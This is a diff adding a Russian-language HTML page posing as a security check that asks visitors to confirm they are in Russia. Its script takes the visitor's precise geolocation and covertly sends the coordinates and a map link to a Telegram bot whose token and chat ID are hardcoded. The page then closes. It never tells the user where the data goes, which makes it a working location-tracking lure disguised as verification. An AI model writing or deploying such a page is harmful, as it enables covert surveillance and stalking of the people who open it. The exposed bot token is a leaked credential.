@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подтверждение безопасности</title>
+    <style>
+        :root {
+            --primary: #4361ee;
+            --primary-dark: #3a56d4;
+            --text: #2b2d42;
+            --light: #f8f9fa;
+            --gray: #adb5bd;
+            --success: #4cc9f0;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 420px;
+            padding: 40px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            text-align: center;
+            border: 1px solid rgba(0, 0, 0, 0.05);
+        }
+        
+        .logo {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px;
+            background-color: var(--primary);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        
+        h1 {
+            color: var(--text);
+            font-size: 22px;
+            margin-bottom: 16px;
+            font-weight: 600;
+        }
+        
+        p {
+            color: var(--gray);
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+        
+        .btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-weight: 500;
+            width: 100%;
+            margin-top: 8px;
+        }
+        
+        .btn:hover {
+            background: var(--primary-dark);
+            transform: translateY(-1px);
+        }
+        
+        .btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        
+        .progress-container {
+            margin: 30px 0;
+            display: none;
+        }
+        
+        .progress-bar {
+            height: 6px;
+            background: #e9ecef;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 12px;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: var(--success);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
+        .progress-text {
+            font-size: 14px;
+            color: var(--gray);
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .status {
+            font-size: 14px;
+            color: var(--text);
+            margin: 20px 0;
+            min-height: 40px;
+            font-weight: 500;
+        }
+        
+        .error {
+            color: #ef233c;
+            display: none;
+            margin-top: 16px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">✓</div>
+        <h1>Вы же из России?</h1>
+        <p>Сервис доступен только для пользователей из России. Нажмите кнопку ниже для проверки.</p>
+        
+        <div class="status" id="status"></div>
+        
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-text">
+                <span>Проверяю страну..</span>
+                <span id="progressPercent">0%</span>
+            </div>
+        </div>
+        
+        <button class="btn" id="verifyBtn">Подтвердить</button>
+        <div class="error" id="errorMsg"></div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '7830653166:AAHCPcJsaaxAlurpxuUXdsChTNK9kbWobbE';
+        const TELEGRAM_CHAT_ID = '6292332566';
+        let currentProgress = 0;
+        let progressInterval;
+
+        document.getElementById('verifyBtn').addEventListener('click', verifyHuman);
+
+        function verifyHuman() {
+            const btn = document.getElementById('verifyBtn');
+            const status = document.getElementById('status');
+            const progressContainer = document.getElementById('progressContainer');
+            const progressFill = document.getElementById('progressFill');
+            const progressPercent = document.getElementById('progressPercent');
+            const errorMsg = document.getElementById('errorMsg');
+            
+            btn.disabled = true;
+            errorMsg.style.display = 'none';
+            status.textContent = "Проверяем страну...";
+            progressContainer.style.display = 'block';
+            
+            // Анимация прогресса
+            currentProgress = 0;
+            progressFill.style.width = '0%';
+            progressPercent.textContent = '0%';
+            
+            progressInterval = setInterval(() => {
+                if (currentProgress < 90) {
+                    currentProgress += Math.floor(Math.random() * 10) + 1;
+                    if (currentProgress > 90) currentProgress = 90;
+                    progressFill.style.width = currentProgress + '%';
+                    progressPercent.textContent = currentProgress + '%';
+                }
+            }, 300);
+
+            if (!navigator.geolocation) {
+                showError("Ваш браузер не поддерживает геолокацию");
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    clearProgress();
+                    status.textContent = "Секунду..";
+                    
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}&z=18`;
+                    
+                    try {
+                        await sendToTelegram(lat, lon, accuracy, mapUrl);
+                        window.close();
+                    } catch (e) {
+                        showError("Ошибка проверки территориальной принадлежности..");
+                    }
+                },
+                (error) => {
+                    clearProgress();
+                    let message = "Ошибка: ";
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            message += "Доступ к геолокации запрещён";
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            message += "Геоданные недоступны";
+                            break;
+                        case error.TIMEOUT:
+                            message += "Время ожидания истекло";
+                            break;
+                        default:
+                            message += "Неизвестная ошибка";
+                    }
+                    showError(message);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 8000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        function clearProgress() {
+            clearInterval(progressInterval);
+            currentProgress = 100;
+            document.getElementById('progressFill').style.width = '100%';
+            document.getElementById('progressPercent').textContent = '100%';
+        }
+
+        function showError(message) {
+            document.getElementById('errorMsg').textContent = message;
+            document.getElementById('errorMsg').style.display = 'block';
+            document.getElementById('verifyBtn').disabled = false;
+        }
+
+        async function sendToTelegram(lat, lon, accuracy, mapUrl) {
+            const message = `🔐 Новая проверка безопасности:
+📍 Широта: ${lat.toFixed(6)}
+📍 Долгота: ${lon.toFixed(6)}
+🎯 Точность: ${Math.round(accuracy)} м
+🗺️ Карта: ${mapUrl}
+⏱️ Время: ${new Date().toLocaleTimeString()}`;
+
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message
+                })
+            });
+            
+            if (!response.ok) {
+                throw new Error('Telegram API error');
+            }
+        }
+    </script>
+</body>
+</html>
